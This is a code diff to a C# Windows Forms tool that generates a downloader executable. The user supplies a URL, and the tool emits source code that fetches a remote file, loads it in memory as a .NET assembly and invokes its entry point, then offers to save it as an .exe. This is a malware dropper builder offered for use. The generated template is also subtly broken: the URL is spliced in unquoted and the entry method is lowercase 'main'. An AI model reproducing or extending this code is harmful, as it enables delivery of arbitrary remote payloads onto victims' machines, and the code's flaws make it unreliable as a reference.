@@ -38,24 +38,38 @@ namespace A3R0SM1TH
 		private void generateButton_Click(object sender, EventArgs e)
 		{
 			String url = fileLinkBox.Text;
-			String text = "using System;\n" +
-					"class downloader\n" +
-					"{\n" +
-					"	WebClient webClient = new WebClient();\n" +
-					"	webClient.DownloadDataCompleted = new DownloadDataCompletedEventHandler(webClient_DownloadDataCompleted);\n" +
-					"	webClient.DownloadDataAsync(new Uri(" + url + "));\n" +
-					"	private void webClient_DownloadDataCompleted(object sender, DownloadDataCompletedEventArgs e)\n" +
-					"	{\n" +
-					"		Byte[] downloadedData = e.Result;\n" +
-					"		Assembly a = Assembly.Load(downloadedData);\n" +
-					"		MethodInfo method = a.EntryPoint;\n" +
-					"		if (method != null)\n" +
-					"		{\n" +
-					"		object o = a.CreateInstance(method.Name);\n" +
-					"		method.Invoke(o, null);\n" +
-					"		}\n" +
-					"	}\n" +
-					"}";
+			String text = @"using System;
+			using System.Collections.Generic;
+			using System.Linq;
+			using System.Net;
+			using System.Reflection;
+			using System.Text;
+			using System.Threading.Tasks;
+
+			namespace ConsoleApp1
+			{
+				class Program
+				{
+					static void main(String[] args)
+					{
+						WebClient webClient = new WebClient();
+						webClient.DownloadDataCompleted += new DownloadDataCompletedEventHandler(webClient_DownloadDataCompleted);
+						webClient.DownloadDataAsync(new Uri(" + url + @"));
+					}
+
+					static void webClient_DownloadDataCompleted(object sender, DownloadDataCompletedEventArgs e)
+					{
+						Byte[] downloadedData = e.Result;
+						Assembly a = Assembly.Load(downloadedData);
+						MethodInfo method = a.EntryPoint;
+						if (method != null)
+						{
+							object o = a.CreateInstance(method.Name);
+							method.Invoke(o, null);
+						}
+					}
+				}
+			}";
 			saveDownloader.Filter = "exe files (*.exe)|.exe";
 			saveDownloader.Title = "Save the .exe File";
 			saveDownloader.ShowDialog();
